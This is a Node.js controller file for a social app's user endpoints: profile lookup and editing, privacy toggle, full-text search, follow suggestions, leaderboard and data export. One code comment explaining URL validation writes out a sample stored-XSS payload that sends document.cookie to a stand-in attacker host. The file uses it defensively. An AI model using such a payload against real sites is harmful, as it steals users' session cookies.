const prisma = require("../lib/prisma");
const { publicUserSelect, postIncludeForFormat, formatPost } = require("../utils/format");
const { getViewerContext } = require("./post.controller");
const { sendServerError } = require("../lib/errorLog");
const { levelForScore } = require("../lib/xp");

// GET /api/users/:username — a profile page, looked up by username (the new
// frontend routes as /profile/:username).
async function getUserByUsername(req, res) {
  try {
    const username = req.params.username;

    const user = await prisma.user.findUnique({
      where: { username },
      select: {
        ...publicUserSelect,
        createdAt: true,
        deletedAt: true,
        score: true,
        pronouns: true,
        currentCity: true,
        work: true,
        education: true,
        gender: true,
        showGender: true,
        orientation: true,
        showOrientation: true,
        githubUrl: true,
        twitterUrl: true,
        linkedinUrl: true,
        instagramUrl: true,
        pinterestUrl: true,
        _count: { select: { posts: true, followers: true, following: true } },
      },
    });

    if (!user || user.deletedAt) {
      return res.status(404).json({ message: "User not found" });
    }

    let isFollowedByMe = false;
    let hasPendingRequest = false;
    if (req.userId && req.userId !== user.id) {
      const [rel, pending] = await Promise.all([
        prisma.follow.findUnique({
          where: {
            followerId_followingId: { followerId: req.userId, followingId: user.id },
          },
        }),
        prisma.followRequest.findUnique({
          where: {
            requesterId_targetId: { requesterId: req.userId, targetId: user.id },
          },
        }),
      ]);
      isFollowedByMe = !!rel;
      hasPendingRequest = !!pending;
    }

    // Gender/orientation are only sent to other viewers when the user
    // opted in via the showGender/showOrientation toggles; the owner
    // always sees their own values (Settings needs them either way).
    const isSelf = req.userId === user.id;
    const { deletedAt, showGender, showOrientation, gender, orientation, ...publicFields } = user;

    return res.json({
      ...publicFields,
      gender: isSelf || showGender ? gender : null,
      showGender,
      orientation: isSelf || showOrientation ? orientation : null,
      showOrientation,
      postsCount: user._count.posts,
      followersCount: user._count.followers,
      followingCount: user._count.following,
      _count: undefined,
      level: levelForScore(user.score),
      isFollowedByMe,
      hasPendingRequest,
      isOwnProfile: isSelf,
    });
  } catch (error) {
    return sendServerError(res, error, req);
  }
}

async function checkUsernameAvailable(req, res) {
  try {
    const username = (req.params.username || "").trim();
    if (username.length < 3) {
      return res.json({ available: false, reason: "Too short" });
    }
    const existing = await prisma.user.findUnique({ where: { username } });
    return res.json({ available: !existing });
  } catch (error) {
    return res.status(500).json({ available: false });
  }
}

// PUT /api/users/me — edit your own profile. Avatar/cover are plain URL
// strings for now (no image upload pipeline in this phase); paste a hosted
// image URL, or wire up uploads later.
const GENDER_OPTIONS = new Set(["woman", "man", "nonbinary", "other"]);
const ORIENTATION_OPTIONS = new Set([
  "straight",
  "gay",
  "lesbian",
  "bisexual",
  "asexual",
  "other",
]);

// githubUrl/twitterUrl/linkedinUrl/instagramUrl/pinterestUrl/avatarUrl/
// coverUrl are all rendered straight into <a href>/<img src> on the
// frontend (ProfilePage.jsx) with no scheme check of their own — so an
// unvalidated value here is a stored-XSS vector: set githubUrl to
// "javascript:fetch('https://evil.example?c='+document.cookie)" and it
// runs, on this origin, in the browser of whoever clicks that "GitHub"
// icon on the attacker's profile. Uploaded media (see media.controller.js's
// mediaUrl()) is always itself a full http(s) URL, so requiring http(s)
// here covers both real uploads and any legitimate external link a user
// pastes in, while shutting out javascript:, data:, vbscript:, and bare
// scheme-less strings alike.
function isValidHttpUrl(value) {
  try {
    const parsed = new URL(value);
    return parsed.protocol === "http:" || parsed.protocol === "https:";
  } catch {
    return false;
  }
}

// avatarUrl and coverUrl only, NOT the social link fields above: the
// frontend's preset avatar/cover picker (see presetAssets.js) generates
// these as inline `data:image/svg+xml` URIs rather than real uploads, so
// they need a second door in besides a real http(s) upload. This is safe
// specifically because avatarUrl/coverUrl are only ever rendered through
// <img src> or a CSS background-image (ProfilePage.jsx and every avatar
// spot in the app) — both sinks where a browser will never execute a
// script embedded in an SVG, unlike the <a href> the comment above is
// protecting. Capped well above anything a generated preset needs, so a
// stray API call can't stuff an arbitrarily large blob into the column.
const DATA_IMAGE_URI_RE = /^data:image\/(png|jpe?g|gif|webp|svg\+xml);[a-z0-9-]+,/i;
const MAX_DATA_IMAGE_URI_LENGTH = 200000;

function isValidImageSrc(value) {
  if (isValidHttpUrl(value)) return true;
  return (
    typeof value === "string" &&
    value.length <= MAX_DATA_IMAGE_URI_LENGTH &&
    DATA_IMAGE_URI_RE.test(value)
  );
}

async function updateProfile(req, res) {
  try {
    const {
      name,
      bio,
      username,
      avatarUrl,
      coverUrl,
      birthday,
      pronouns,
      currentCity,
      work,
      education,
      gender,
      showGender,
      orientation,
      showOrientation,
      githubUrl,
      twitterUrl,
      linkedinUrl,
      instagramUrl,
      pinterestUrl,
    } = req.body;

    if (gender !== undefined && gender !== null && gender !== "" && !GENDER_OPTIONS.has(gender)) {
      return res.status(400).json({ message: "Invalid gender value" });
    }
    if (
      orientation !== undefined &&
      orientation !== null &&
      orientation !== "" &&
      !ORIENTATION_OPTIONS.has(orientation)
    ) {
      return res.status(400).json({ message: "Invalid orientation value" });
    }

    const imageUrlFields = { avatarUrl, coverUrl };
    for (const [field, value] of Object.entries(imageUrlFields)) {
      if (value !== undefined && value !== null && value !== "" && !isValidImageSrc(value)) {
        return res.status(400).json({ message: `${field} must be a valid http(s) URL or preset image` });
      }
    }
    const linkUrlFields = { githubUrl, twitterUrl, linkedinUrl, instagramUrl, pinterestUrl };
    for (const [field, value] of Object.entries(linkUrlFields)) {
      if (value !== undefined && value !== null && value !== "" && !isValidHttpUrl(value)) {
        return res.status(400).json({ message: `${field} must be a valid http(s) URL` });
      }
    }

    const updated = await prisma.user.update({
      where: { id: req.userId },
      data: {
        name: name?.trim() || undefined,
        bio: bio === undefined ? undefined : bio,
        username: username?.trim() || undefined,
        avatarUrl: avatarUrl === undefined ? undefined : avatarUrl,
        coverUrl: coverUrl === undefined ? undefined : coverUrl,
        birthday: birthday === undefined ? undefined : birthday ? new Date(birthday) : null,
        pronouns: pronouns === undefined ? undefined : pronouns || null,
        currentCity: currentCity === undefined ? undefined : currentCity || null,
        work: work === undefined ? undefined : work || null,
        education: education === undefined ? undefined : education || null,
        gender: gender === undefined ? undefined : gender || null,
        showGender: showGender === undefined ? undefined : !!showGender,
        orientation: orientation === undefined ? undefined : orientation || null,
        showOrientation: showOrientation === undefined ? undefined : !!showOrientation,
        githubUrl: githubUrl === undefined ? undefined : githubUrl || null,
        twitterUrl: twitterUrl === undefined ? undefined : twitterUrl || null,
        linkedinUrl: linkedinUrl === undefined ? undefined : linkedinUrl || null,
        instagramUrl: instagramUrl === undefined ? undefined : instagramUrl || null,
        pinterestUrl: pinterestUrl === undefined ? undefined : pinterestUrl || null,
      },
      select: {
        ...publicUserSelect,
        birthday: true,
        pronouns: true,
        currentCity: true,
        work: true,
        education: true,
        gender: true,
        showGender: true,
        orientation: true,
        showOrientation: true,
        githubUrl: true,
        twitterUrl: true,
        linkedinUrl: true,
        instagramUrl: true,
        pinterestUrl: true,
      },
    });

    return res.json(updated);
  } catch (error) {
    if (error.code === "P2002") {
      return res.status(400).json({ message: "That username is already taken" });
    }
    return sendServerError(res, error, req);
  }
}

// PUT /api/users/me/privacy — Settings > Privacy & Safety > "Private
// account". Kept separate from updateProfile above so flipping it is a
// one-click, immediate save, not bundled in with the rest of the profile
// form.
async function updatePrivacy(req, res) {
  try {
    const { isPrivate } = req.body;
    if (typeof isPrivate !== "boolean") {
      return res.status(400).json({ message: "isPrivate must be true or false" });
    }

    const updated = await prisma.user.update({
      where: { id: req.userId },
      data: { isPrivate },
      select: { isPrivate: true },
    });

    // Switching back to public: nobody should be left waiting on a
    // request an account no longer needs — accept everyone who already
    // asked, the same way Instagram does when you go public.
    if (!isPrivate) {
      const pending = await prisma.followRequest.findMany({ where: { targetId: req.userId } });
      for (const request of pending) {
        await prisma.follow.upsert({
          where: {
            followerId_followingId: { followerId: request.requesterId, followingId: req.userId },
          },
          update: {},
          create: { followerId: request.requesterId, followingId: req.userId },
        });
      }
      if (pending.length) {
        await prisma.followRequest.deleteMany({ where: { targetId: req.userId } });
      }
    }

    return res.json(updated);
  } catch (error) {
    return sendServerError(res, error, req);
  }
}

// Turns free-typed search text into a Postgres tsquery string with prefix
// matching on the last word — e.g. "sourabh cook" -> "sourabh & cook:*". The
// trailing ":*" is what makes results show up while someone is still
// typing (plainto_tsquery alone only matches whole, already-finished
// stemmed words, which feels unresponsive for search-as-you-type). Each
// word is stripped down to plain alphanumerics since anything else isn't
// valid tsquery lexeme syntax — a query left with nothing usable returns
// null, which the caller treats as "no results" rather than querying.
function buildPrefixTsQuery(raw) {
  const words = (raw || "")
    .trim()
    .split(/\s+/)
    .slice(0, 8)
    .map((w) => w.replace(/[^a-zA-Z0-9]/g, ""))
    .filter(Boolean);
  if (!words.length) return null;
  return words.map((w, i) => (i === words.length - 1 ? `${w}:*` : w)).join(" & ");
}

// GET /api/users/search?q= — used by the search page. Posts and people are
// ranked with Postgres full-text search (see the GIN expression indexes in
// the 2.0 migration SQL); tags stay a plain substring match since they're
// short, single-word, and there's rarely more than a handful to rank.
async function searchAll(req, res) {
  try {
    const q = (req.query.q || "").trim();
    if (!q) return res.json({ users: [], tags: [], posts: [] });

    const tsQuery = buildPrefixTsQuery(q);
    if (!tsQuery) return res.json({ users: [], tags: [], posts: [] });

    // Users search still surfaces private accounts (so people can find and
    // request to follow them) — but posts from a private account are left
    // out of search results unless the searcher already follows them.
    const viewerId = req.userId || 0;
    const [postMatches, userMatches, tags] = await Promise.all([
      prisma.$queryRaw`
        SELECT p.id, ts_rank(
          to_tsvector('english', p.title || ' ' || p.content),
          to_tsquery('english', ${tsQuery})
        ) AS rank
        FROM "Post" p
        JOIN "User" u ON u.id = p."authorId"
        WHERE p."repostOfId" IS NULL
          AND u."deletedAt" IS NULL
          AND (
            u."isPrivate" = false
            OR u.id = ${viewerId}
            OR EXISTS (
              SELECT 1 FROM "Follow" f WHERE f."followerId" = ${viewerId} AND f."followingId" = u.id
            )
          )
          AND to_tsvector('english', p.title || ' ' || p.content) @@ to_tsquery('english', ${tsQuery})
        ORDER BY rank DESC
        LIMIT 20
      `,
      prisma.$queryRaw`
        SELECT id, ts_rank(
          to_tsvector('english', username || ' ' || name || ' ' || coalesce(bio, '')),
          to_tsquery('english', ${tsQuery})
        ) AS rank
        FROM "User"
        WHERE "deletedAt" IS NULL
          AND username IS NOT NULL
          AND to_tsvector('english', username || ' ' || name || ' ' || coalesce(bio, '')) @@ to_tsquery('english', ${tsQuery})
        ORDER BY rank DESC
        LIMIT 10
      `,
      prisma.tag.findMany({
        where: { name: { contains: q, mode: "insensitive" } },
        take: 5,
        select: { id: true, name: true },
      }),
    ]);

    // Raw queries give back ranked ids, not the full rows the frontend
    // needs — re-fetch those, then restore the rank order in JS since
    // findMany(id IN [...]) doesn't preserve the order of the id list.
    const postIds = postMatches.map((r) => r.id);
    const userIds = userMatches.map((r) => r.id);

    const [posts, users] = await Promise.all([
      postIds.length
        ? prisma.post.findMany({ where: { id: { in: postIds } }, include: postIncludeForFormat })
        : [],
      userIds.length
        ? prisma.user.findMany({ where: { id: { in: userIds } }, select: publicUserSelect })
        : [],
    ]);
    const postById = new Map(posts.map((p) => [p.id, p]));
    const orderedPosts = postIds.map((id) => postById.get(id)).filter(Boolean);
    const userById = new Map(users.map((u) => [u.id, u]));
    const orderedUsers = userIds.map((id) => userById.get(id)).filter(Boolean);

    const { followedAuthorIds, bookmarkedPostIds, mutedAuthorIds } = await getViewerContext(
      req.userId,
      orderedPosts,
    );
    const formattedPosts = orderedPosts.map((p) =>
      formatPost(p, req.userId, followedAuthorIds, bookmarkedPostIds, mutedAuthorIds),
    );

    return res.json({ users: orderedUsers, tags, posts: formattedPosts });
  } catch (error) {
    return sendServerError(res, error, req);
  }
}

// GET /api/users/suggestions — "people to follow" sidebar. Prioritizes
// mutual connections (people your follows follow), same idea as before.
async function getSuggestedUsers(req, res) {
  try {
    const me = req.userId;
    const limit = 6;

    if (!me) {
      const users = await prisma.user.findMany({
        where: { deletedAt: null },
        orderBy: { score: "desc" },
        take: limit,
        select: publicUserSelect,
      });
      return res.json(users);
    }

    const myFollowing = await prisma.follow.findMany({
      where: { followerId: me },
      select: { followingId: true },
    });
    const followingIds = myFollowing.map((f) => f.followingId);
    const excludeIds = [...followingIds, me];

    const mutuals = await prisma.follow.findMany({
      where: { followerId: { in: followingIds } },
      select: { followingId: true },
    });
    const mutualCounts = {};
    for (const m of mutuals) {
      if (!excludeIds.includes(m.followingId)) {
        mutualCounts[m.followingId] = (mutualCounts[m.followingId] || 0) + 1;
      }
    }
    const rankedMutualIds = Object.entries(mutualCounts)
      .sort((a, b) => b[1] - a[1])
      .map(([id]) => Number(id))
      .slice(0, limit);

    let suggestions = [];
    if (rankedMutualIds.length > 0) {
      suggestions = await prisma.user.findMany({
        where: { id: { in: rankedMutualIds }, deletedAt: null },
        select: publicUserSelect,
      });
      suggestions.sort(
        (a, b) => rankedMutualIds.indexOf(a.id) - rankedMutualIds.indexOf(b.id),
      );
    }

    if (suggestions.length < limit) {
      const alreadyHave = [...excludeIds, ...suggestions.map((s) => s.id)];
      const filler = await prisma.user.findMany({
        where: { id: { notIn: alreadyHave }, deletedAt: null },
        orderBy: { score: "desc" },
        take: limit - suggestions.length,
        select: publicUserSelect,
      });
      suggestions = [...suggestions, ...filler];
    }

    return res.json(suggestions);
  } catch (error) {
    return sendServerError(res, error, req);
  }
}

// A handful of accounts are exempt from ranking on the leaderboard — the
// creator's own account plus a couple of joke/pet accounts — mirroring the
// old app's behavior, which quietly excluded these same accounts. Matched
// by username/name fragment rather than id, since ids aren't stable between
// the old app and this one.
const LEADERBOARD_EXCLUDED_FRAGMENTS = ["sourabh", "pikku", "tonald"];

function isLeaderboardExempt(user) {
  const haystack = `${user.username || ""} ${user.name || ""}`.toLowerCase();
  return LEADERBOARD_EXCLUDED_FRAGMENTS.some((fragment) => haystack.includes(fragment));
}

// GET /api/users/leaderboard — top 20 users by score, newest sheeters climb
// this by posting, commenting, and getting upvoted (see wherever score is
// incremented across the other controllers).
async function getLeaderboard(req, res) {
  try {
    // Pull extra candidates before filtering out exempt accounts, so a
    // couple of exclusions never leave the list short of 20.
    const candidates = await prisma.user.findMany({
      where: { deletedAt: null },
      orderBy: { score: "desc" },
      take: 20 + LEADERBOARD_EXCLUDED_FRAGMENTS.length * 5,
      // publicUserSelect doesn't include score by default (it's used all over
      // the app for author/suggestion cards where a score isn't shown) — the
      // leaderboard is the one place that needs it.
      select: { ...publicUserSelect, score: true },
    });
    const users = candidates
      .filter((u) => !isLeaderboardExempt(u))
      .slice(0, 20)
      .map((u) => ({ ...u, level: levelForScore(u.score) }));
    return res.json(users);
  } catch (error) {
    return sendServerError(res, error, req);
  }
}

// GET /api/users/me/export — a "download your data" export, deliberately
// scoped to leave out direct messages (a DM also exposes the other
// person's side of the conversation, not just yours) and anything that's
// pure security material rather than "your data" — password hash, 2FA
// secret/backup codes, reset tokens. Everything else you've created or
// done in the app is included.
async function exportMyData(req, res) {
  try {
    const userId = req.userId;

    const [
      profile,
      posts,
      comments,
      votes,
      bookmarks,
      following,
      followers,
      blocking,
      blockedBy,
      muting,
      notifications,
      arcadeScores,
      taggedInPosts,
    ] = await Promise.all([
      prisma.user.findUnique({
        where: { id: userId },
        select: {
          id: true,
          name: true,
          username: true,
          email: true,
          bio: true,
          avatarUrl: true,
          coverUrl: true,
          createdAt: true,
          birthday: true,
          pronouns: true,
          currentCity: true,
          work: true,
          education: true,
          gender: true,
          showGender: true,
          orientation: true,
          showOrientation: true,
          githubUrl: true,
          twitterUrl: true,
          linkedinUrl: true,
          instagramUrl: true,
          pinterestUrl: true,
          score: true,
          currentStreak: true,
          emailVerified: true,
          twoFactorEnabled: true,
        },
      }),
      prisma.post.findMany({
        where: { authorId: userId },
        select: { id: true, content: true, imageUrl: true, videoUrl: true, createdAt: true, updatedAt: true },
        orderBy: { createdAt: "asc" },
      }),
      prisma.comment.findMany({
        where: { userId },
        select: { id: true, postId: true, parentId: true, content: true, createdAt: true },
        orderBy: { createdAt: "asc" },
      }),
      prisma.like.findMany({ where: { userId }, select: { postId: true, type: true } }),
      prisma.bookmark.findMany({ where: { userId }, select: { postId: true } }),
      prisma.follow.findMany({
        where: { followerId: userId },
        select: { following: { select: { username: true } } },
      }),
      prisma.follow.findMany({
        where: { followingId: userId },
        select: { follower: { select: { username: true } } },
      }),
      prisma.block.findMany({
        where: { blockerId: userId },
        select: { blocked: { select: { username: true } }, createdAt: true },
      }),
      prisma.block.findMany({
        where: { blockedId: userId },
        select: { blocker: { select: { username: true } }, createdAt: true },
      }),
      prisma.mute.findMany({
        where: { muterId: userId },
        select: { muted: { select: { username: true } }, createdAt: true },
      }),
      prisma.notification.findMany({
        where: { recipientId: userId },
        select: {
          type: true,
          read: true,
          createdAt: true,
          postId: true,
          message: true,
          actor: { select: { username: true } },
        },
        orderBy: { createdAt: "asc" },
      }),
      prisma.arcadeScore.findMany({
        where: { userId },
        select: { gameSlug: true, score: true, updatedAt: true, lastPlayedAt: true },
      }),
      prisma.postTaggedUser.findMany({
        where: { userId },
        select: { postId: true },
      }),
    ]);

    return res.json({
      exportedAt: new Date().toISOString(),
      note: "Direct messages aren't included in this export, since a DM also contains the other person's side of the conversation.",
      profile,
      posts,
      comments,
      votes,
      bookmarks,
      following: following.map((f) => f.following.username),
      followers: followers.map((f) => f.follower.username),
      blocking: blocking.map((b) => ({ username: b.blocked.username, createdAt: b.createdAt })),
      blockedBy: blockedBy.map((b) => ({ username: b.blocker.username, createdAt: b.createdAt })),
      muting: muting.map((m) => ({ username: m.muted.username, createdAt: m.createdAt })),
      notifications: notifications.map((n) => ({ ...n, actor: n.actor?.username || null })),
      arcadeScores,
      taggedInPostIds: taggedInPosts.map((t) => t.postId),
    });
  } catch (error) {
    return sendServerError(res, error, req);
  }
}

module.exports = {
  getUserByUsername,
  checkUsernameAvailable,
  updateProfile,
  updatePrivacy,
  searchAll,
  getSuggestedUsers,
  getLeaderboard,
  exportMyData,
};
